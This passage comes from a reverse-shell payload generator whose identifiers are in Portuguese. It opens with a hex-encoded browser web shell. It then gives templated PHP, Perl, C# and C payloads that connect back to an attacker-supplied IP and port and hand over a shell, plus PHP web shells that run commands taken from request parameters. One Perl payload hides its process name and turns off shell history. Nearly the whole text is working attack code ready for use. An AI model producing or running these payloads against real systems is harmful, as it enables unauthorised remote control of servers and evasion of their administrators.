0202020202020202020637764203D20637764207C7C20227E223B0D0A202020202020202020202020202020207661722073686F7274437764203D206377643B0D0A20202020202020202020202020202020696620286377642E73706C697428222F22292E6C656E677468203E203329207B0D0A20202020202020202020202020202020202020207661722073706C6974746564437764203D206377642E73706C697428222F22293B0D0A202020202020202020202020202020202020202073686F7274437764203D202220262F22202B2073706C69747465644377645B73706C69747465644377642E6C656E6774682D325D202B20222F22202B2073706C69747465644377645B73706C69747465644377642E6C656E6774682D315D3B0D0A202020202020202020202020202020207D0D0A2020202020202020202020202020202072657475726E205348454C4C5F434F4E4649475B22757365726E616D65225D202B20224022202B205348454C4C5F434F4E4649475B22686F73746E616D65225D202B20223A3C7370616E207469746C653D5C2222202B20637764202B20225C223E22202B2073686F7274437764202B20223C2F7370616E3E23223B0D0A2020202020202020202020207D0D0A0D0A20202020202020202020202066756E6374696F6E207570646174654377642863776429207B0D0A202020202020202020202020202020206966202863776429207B0D0A2020202020202020202020202020202020202020435744203D206377643B0D0A20202020202020202020202020202020202020205F75706461746550726F6D707428293B0D0A202020202020202020202020202020202020202072657475726E3B0D0A202020202020202020202020202020207D0D0A202020202020202020202020202020206D616B655265717565737428223F666561747572653D707764222C207B7D2C2066756E6374696F6E28726573706F6E736529207B0D0A2020202020202020202020202020202020202020435744203D2061746F6228726573706F6E73652E637764293B0D0A20202020202020202020202020202020202020205F75706461746550726F6D707428293B0D0A202020202020202020202020202020207D293B0D0A0D0A2020202020202020202020207D0D0A0D0A20202020202020202020202066756E6374696F6E2065736361706548746D6C28737472696E6729207B0D0A2020202020202020202020202020202072657475726E20737472696E670D0A20202020202020202020202020202020202020202E7265706C616365282F262F672C202226616D703B22290D0A20202020202020202020202020202020202020202E7265706C616365282F3C2F672C2022266C743B22290D0A20202020202020202020202020202020202020202E7265706C616365282F3E2F672C20222667743B22293B0D0A2020202020202020202020207D0D0A0D0A20202020202020202020202066756E6374696F6E205F75706461746550726F6D70742829207B0D0A2020202020202020202020202020202076617220655368656C6C50726F6D7074203D20646F63756D656E742E676574456C656D656E744279496428227368656C6C2D70726F6D707422293B0D0A20202020202020202020202020202020655368656C6C50726F6D70742E696E6E657248544D4C203D2067656E50726F6D707428435744293B0D0A2020202020202020202020207D0D0A0D0A20202020202020202020202066756E6374696F6E205F6F6E5368656C6C436D644B6579446F776E286576656E7429207B0D0A2020202020202020202020202020202073776974636820286576656E742E6B657929207B0D0A2020202020202020202020202020202020202020636173652022456E746572223A0D0A202020202020202020202020202020202020202020202020666561747572655368656C6C28655368656C6C436D64496E7075742E76616C7565293B0D0A202020202020202020202020202020202020202020202020696E73657274546F486973746F727928655368656C6C436D64496E7075742E76616C7565293B0D0A202020202020202020202020202020202020202020202020655368656C6C436D64496E7075742E76616C7565203D2022223B0D0A202020202020202020202020202020202020202020202020627265616B3B0D0A20202020202020202020202020202020202020206361736520224172726F775570223A0D0A20202020202020202020202020202020202020202020202069662028686973746F7279506F736974696F6E203E203029207B0D0A20202020202020202020202020202020202020202020202020202020686973746F7279506F736974696F6E2D2D3B0D0A20202020202020202020202020202020202020202020202020202020655368656C6C436D64496E7075742E626C757228293B0D0A20202020202020202020202020202020202020202020202020202020655368656C6C436D64496E7075742E76616C7565203D20636F6D6D616E64486973746F72795B686973746F7279506F736974696F6E5D3B0D0A202020202020202020202020202020202020202020202020202020205F64656665722866756E6374696F6E2829207B0D0A2020202020202020202020202020202020202020202020202020202020202020655368656C6C436D64496E7075742E666F63757328293B0D0A202020202020202020202020202020202020202020202020202020207D293B0D0A2020202020202020202020202020202020202020202020207D0D0A202020202020202020202020202020202020202020202020627265616B3B0D0A20202020202020202020202020202020202020206361736520224172726F77446F776E223A0D0A20202020202020202020202020202020202020202020202069662028686973746F7279506F736974696F6E203E3D20636F6D6D616E64486973746F72792E6C656E67746829207B0D0A20202020202020202020202020202020202020202020202020202020627265616B3B0D0A2020202020202020202020202020202020202020202020207D0D0A202020202020202020202020202020202020202020202020686973746F7279506F736974696F6E2B2B3B0D0A20202020202020202020202020202020202020202020202069662028686973746F7279506F736974696F6E203D3D3D20636F6D6D616E64486973746F72792E6C656E67746829207B0D0A20202020202020202020202020202020202020202020202020202020655368656C6C436D64496E7075742E76616C7565203D2022223B0D0A2020202020202020202020202020202020202020202020207D20656C7365207B0D0A20202020202020202020202020202020202020202020202020202020655368656C6C436D64496E7075742E626C757228293B0D0A20202020202020202020202020202020202020202020202020202020655368656C6C436D64496E7075742E666F63757328293B0D0A20202020202020202020202020202020202020202020202020202020655368656C6C436D64496E7075742E76616C7565203D20636F6D6D616E64486973746F72795B686973746F7279506F736974696F6E5D3B0D0A2020202020202020202020202020202020202020202020207D0D0A202020202020202020202020202020202020202020202020627265616B3B0D0A2020202020202020202020202020202020202020636173652027546162273A0D0A2020202020202020202020202020202020202020202020206576656E742E70726576656E7444656661756C7428293B0D0A2020202020202020202020202020202020202020202020206665617475726548696E7428293B0D0A202020202020202020202020202020202020202020202020627265616B3B0D0A202020202020202020202020202020207D0D0A2020202020202020202020207D0D0A0D0A20202020202020202020202066756E6374696F6E20696E73657274546F486973746F727928636D6429207B0D0A20202020202020202020202020202020636F6D6D616E64486973746F72792E7075736828636D64293B0D0A20202020202020202020202020202020686973746F7279506F736974696F6E203D20636F6D6D616E64486973746F72792E6C656E6774683B0D0A2020202020202020202020207D0D0A0D0A20202020202020202020202066756E6374696F6E206D616B65526571756573742875726C2C20706172616D732C2063616C6C6261636B29207B0D0A2020202020202020202020202020202066756E6374696F6E206765745175657279537472696E672829207B0D0A20202020202020202020202020202020202020207661722061203D205B5D3B0D0A2020202020202020202020202020202020202020666F722028766172206B657920696E20706172616D7329207B0D0A20202020202020202020202020202020202020202020202069662028706172616D732E6861734F776E50726F7065727479286B65792929207B0D0A20202020202020202020202020202020202020202020202020202020612E7075736828656E636F6465555249436F6D706F6E656E74286B657929202B20223D22202B20656E636F6465555249436F6D706F6E656E7428706172616D735B6B65795D29293B0D0A2020202020202020202020202020202020202020202020207D0D0A20202020202020202020202020202020202020207D0D0A202020202020202020202020202020202020202072657475726E20612E6A6F696E28222622293B0D0A202020202020202020202020202020207D0D0A2020202020202020202020202020202076617220786872203D206E657720584D4C487474705265717565737428293B0D0A202020202020202020202020202020207868722E6F70656E2822504F5354222C2075726C2C2074727565293B0D0A202020202020202020202020202020207868722E736574526571756573744865616465722822436F6E74656E742D54797065222C20226170706C69636174696F6E2F782D7777772D666F726D2D75726C656E636F64656422293B0D0A202020202020202020202020202020207868722E6F6E726561647973746174656368616E6765203D2066756E6374696F6E2829207B0D0A2020202020202020202020202020202020202020696620287868722E72656164795374617465203D3D3D2034202626207868722E737461747573203D3D3D2032303029207B0D0A202020202020202020202020202020202020202020202020747279207B0D0A2020202020202020202020202020202020202020202020202020202076617220726573706F6E73654A736F6E203D204A534F4E2E7061727365287868722E726573706F6E736554657874293B0D0A2020202020202020202020202020202020202020202020202020202063616C6C6261636B28726573706F6E73654A736F6E293B0D0A2020202020202020202020202020202020202020202020207D20636174636820286572726F7229207B0D0A20202020202020202020202020202020202020202020202020202020616C65727428224572726F72207768696C652070617273696E6720726573706F6E73653A2022202B206572726F72293B0D0A2020202020202020202020202020202020202020202020207D0D0A20202020202020202020202020202020202020207D0D0A202020202020202020202020202020207D3B0D0A202020202020202020202020202020207868722E73656E64286765745175657279537472696E672829293B0D0A2020202020202020202020207D0D0A0D0A202020202020202020202020646F63756D656E742E6F6E636C69636B203D2066756E6374696F6E286576656E7429207B0D0A202020202020202020202020202020206576656E74203D206576656E74207C7C2077696E646F772E6576656E743B0D0A202020202020202020202020202020207661722073656C656374696F6E203D2077696E646F772E67657453656C656374696F6E28293B0D0A2020202020202020202020202020202076617220746172676574203D206576656E742E746172676574207C7C206576656E742E737263456C656D656E743B0D0A0D0A20202020202020202020202020202020696620287461726765742E7461674E616D65203D3D3D202253454C4543542229207B0D0A202020202020202020202020202020202020202072657475726E3B0D0A202020202020202020202020202020207D0D0A0D0A20202020202020202020202020202020696620282173656C656374696F6E2E746F537472696E67282929207B0D0A2020202020202020202020202020202020202020655368656C6C436D64496E7075742E666F63757328293B0D0A202020202020202020202020202020207D0D0A2020202020202020202020207D3B0D0A0D0A20202020202020202020202077696E646F772E6F6E6C6F6164203D2066756E6374696F6E2829207B0D0A20202020202020202020202020202020655368656C6C436D64496E707574203D20646F63756D656E742E676574456C656D656E744279496428227368656C6C2D636D6422293B0D0A20202020202020202020202020202020655368656C6C436F6E74656E74203D20646F63756D656E742E676574456C656D656E744279496428227368656C6C2D636F6E74656E7422293B0D0A2020202020202020202020202020202075706461746543776428293B0D0A20202020202020202020202020202020655368656C6C436D64496E7075742E666F63757328293B0D0A2020202020202020202020207D3B0D0A20202020202020203C2F7363726970743E0D0A202020203C2F686561643E0D0A0D0A202020203C626F64793E0D0A20202020202020203C6469762069643D227368656C6C223E0D0A2020202020202020202020203C7072652069643D227368656C6C2D636F6E74656E74223E0D0A202020202020202020202020202020203C6469762069643D227368656C6C2D6C6F676F223E0D0A20202020202020205F5F5F202020202020202020202020202020202020202020202020205F5F5F5F2020202020205F202020202020202020205F205F20202020202020205F20205F2020203C7370616E3E3C2F7370616E3E0D0A205F205F5F20202F205F205C5F5F2020202020205F5F5F205F5F20205F2020205F20202F205F5F205C205F5F5F7C207C5F5F2020205F5F5F7C207C207C5F202F5C2F7C7C207C7C207C5F203C7370616E3E3C2F7370616E3E0D0A7C20275F205C7C207C207C205C205C202F5C202F202F20275F205C7C207C207C207C2F202F205F60202F205F5F7C20275F205C202F205F205C207C20285F292F5C2F5F20202E2E20205F7C3C7370616E3E3C2F7370616E3E0D0A7C207C5F29207C207C5F7C207C5C2056202056202F7C207C207C207C207C5F7C207C207C20285F7C205C5F5F205C207C207C207C20205F5F2F207C207C5F2020207C5F2020202020205F7C3C7370616E3E3C2F7370616E3E0D0A7C202E5F5F2F205C5F5F5F2F20205C5F2F5C5F2F207C5F7C207C5F7C5C5F5F2C207C5C205C5F5F2C5F7C5F5F5F2F5F7C207C5F7C5C5F5F5F7C5F7C5F285F29202020207C5F7C7C5F7C20203C7370616E3E3C2F7370616E3E0D0A7C5F7C202020202020202020202020202020202020202020202020207C5F5F5F2F20205C5F5F5F5F2F202020202020202020202020202020202020202020202020202020202020202020203C7370616E3E3C2F7370616E3E0D0A202020202020202020202020202020203C2F6469763E0D0A2020202020202020202020203C2F7072653E0D0A2020202020202020202020203C6469762069643D227368656C6C2D696E707574223E0D0A202020202020202020202020202020203C6C6162656C20666F723D227368656C6C2D636D64222069643D227368656C6C2D70726F6D70742220636C6173733D227368656C6C2D70726F6D7074223E3F3F3F3C2F6C6162656C3E0D0A202020202020202020202020202020203C6469763E0D0A20202020202020202020202020202020202020203C696E7075742069643D227368656C6C2D636D6422206E616D653D22636D6422206F6E6B6579646F776E3D225F6F6E5368656C6C436D644B6579446F776E286576656E7429222F3E0D0A202020202020202020202020202020203C2F6469763E0D0A2020202020202020202020203C2F6469763E0D0A20202020202020203C2F6469763E0D0A202020203C2F626F64793E0D0A0D0A3C2F68746D6C3E"""
		payload = codecs.decode(payloadr, 'hex').decode('utf-8')
	if executavel == 'php11':
		extensao = 'php'
		payloadr = """$sock=fsockopen("#IP#",#PORTA#);$proc=proc_open("#SHELL#", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)
	if executavel == 'php10':
		extensao = 'php'
		payloadr = """$sock=fsockopen("#IP#",#PORTA#);popen("#SHELL# <&3 >&3 2>&3", "r");"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)	
	if executavel == 'php9':
		extensao = 'php'
		payloadr = """$sock=fsockopen("#IP#",#PORTA#);`#SHELL# <&3 >&3 2>&3`;"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)
	if executavel == 'php8':
		extensao = 'php'
		payloadr = """$sock=fsockopen("#IP#",#PORTA#)
passthru("#SHELL# <&3 >&3 2>&3")"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)
	if executavel == 'php7':
		extensao = 'php'
		payloadr = """$sock=fsockopen("#IP#",#PORTA#)
system("#SHELL# <&3 >&3 2>&3")"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)
	if executavel == 'php6':
		extensao = 'php'
		payloadr = """$sock=fsockopen("#IP#",#PORTA#)
shell_exec("#SHELL# <&3 >&3 2>&3")"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)	
	if executavel == 'php5':
		extensao = 'php'
		payloadr = """$sock=fsockopen("#IP#",#PORTA#)
exec("#SHELL# <&3 >&3 2>&3")"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)		
	if executavel == 'php4':
		extensao = 'php'
		payloadr = '''<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>'''
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)	
	if executavel == 'php3':
		extensao = 'php'
		payloadr = """<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)	
	if executavel == 'php2':
		extensao = 'php'
		payloadr = """<?php
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;    // read/write buffer size
    private $clen    = 0;       // command length
    private $error   = false;   // stream read/write error
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
            $this->os    = 'LINUX';
            $this->shell = '#SHELL#';
        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
        } else if (posix_setsid() < 0) {
            // once daemonized you will actually no longer see the script's dump
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        $data = str_replace('<', '&lt;', $data);
        $data = str_replace('>', '&gt;', $data);
        echo $data;
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot read from ${name}, script will now exit...\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot write to ${name}, script will now exit...\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->dump($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); // script's dump
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\n");
                    do {
						$status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('#IP#', #PORTA#);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)

	if executavel == 'php1':
		extensao = 'php'
		payloadr = """<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '#IP#';
$port = #PORTA#;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; #SHELL# -i';
$daemon = 0;
$debug = 0
if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}
?>"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)

	if executavel == 'perl1':
		extensao = 'pl'
		payloadr = """use Socket;$i="#IP#";$p=#PORTA#;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("#SHELL# -i");};"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)
		
	if executavel == 'perl2':
		extensao = 'pl'
		payload = f'''
$p=fork
exit,if($p)
$c=new IO::Socket::INET(PeerAddr,"{IP}:{PORTA}")
STDIN->fdopen($c,r)
$~->fdopen($c,w);system$_ while<>'''
	if executavel == 'perl3':
		extensao = 'pl'
		payloadr = """use strict;
use Socket;
use FileHandle;
use POSIX;
my $VERSION = "1.0";

# Where to send the reverse shell.  Change these.
my $ip = '#IP#';
my $port = #PORTA#;

# Options
my $daemon = 1;
my $auth   = 0; # 0 means authentication is disabled and any 
		# source IP can access the reverse shell
my $authorised_client_pattern = qr(^127\.0\.0\.1$);

# Declarations
my $global_page = "";
my $fake_process_name = "/usr/sbin/apache";

# Change the process name to be less conspicious
$0 = "[httpd]";

# Authenticate based on source IP address if required
if (defined($ENV{'REMOTE_ADDR'})) {
	cgiprint("Browser IP address appears to be: $ENV{'REMOTE_ADDR'}");

	if ($auth) {
		unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {
			cgiprint("ERROR: Your client isn't authorised to view this page");
			cgiexit();
		}
	}
} elsif ($auth) {
	cgiprint("ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access");
	cgiexit(0);
}

# Background and dissociate from parent process if required
if ($daemon) {
	my $pid = fork();
	if ($pid) {
		cgiexit(0); # parent exits
	}

	setsid();
	chdir('/');
	umask(0);
}

# Make TCP connection for reverse shell
socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
	cgiprint("Sent reverse shell to $ip:$port");
	cgiprintpage();
} else {
	cgiprint("Couldn't open reverse shell to $ip:$port: $!");
	cgiexit();	
}

# Redirect STDIN, STDOUT and STDERR to the TCP connection
open(STDIN, ">&SOCK");
open(STDOUT,">&SOCK");
open(STDERR,">&SOCK");
$ENV{'HISTFILE'} = '/dev/null';
system("w;uname -a;id;pwd");
exec({"#SHELL#"} ($fake_process_name, "-i"));

# Wrapper around print
sub cgiprint {
	my $line = shift;
	$line .= "<p>\n";
	$global_page .= $line;
}

# Wrapper around exit
sub cgiexit {
	cgiprintpage();
	exit 0; # 0 to ensure we don't give a 500 response.
}

# Form HTTP response using all the messages gathered by cgiprint so far
sub cgiprintpage {
	print "Content-Length: " . length($global_page) . "\r
Connection: close\r
Content-Type: text\/html\r\n\r\n" . $global_page;
}"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)

	if executavel == 'c4':
		extensao = 'c'
		payloadr = """using System;
using System.Diagnostics;

namespace BackConnect {
  class ReverseBash {
	public static void Main(string[] args) {
	  Process proc = new System.Diagnostics.Process();
	  proc.StartInfo.FileName = "#SHELL#";
	  proc.StartInfo.Arguments = "-c \"#SHELL# -i >& /dev/tcp/#IP#/#PORTA# 0>&1\"";
	  proc.StartInfo.UseShellExecute = false;
	  proc.StartInfo.RedirectStandardOutput = true;
	  proc.Start();

	  while (!proc.StandardOutput.EndOfStream) {
		Console.WriteLine(proc.StandardOutput.ReadLine());
	  }
	}
  }
}"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)

	if executavel == 'c3':
		extensao = 'c'
		payloadr = """using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient("#IP#", #PORTA#))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);
						
						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "#SHELL#";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)

	if executavel == 'c2':
		extensao = 'c'
		payloadr = """#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax; 
char ip_addr[16] = "#IP#"; 
char port[6] = "#PORTA#";            

STARTUPINFO ini_processo;

PROCESS_INFORMATION processo_info;

int main()
{
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);


    struct hostent *host; 
    host = gethostbyname(ip_addr);
    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    TCHAR cmd[255] = TEXT("cmd.exe");

    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    return 0;
}"""
		payload = payloadr.replace('#IP#', IP).replace('#PORTA#', str(PORTA)).replace('#SHELL#', shell)

	if executavel == 'c1':
		extensao = 'c'
		payloadr = """#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
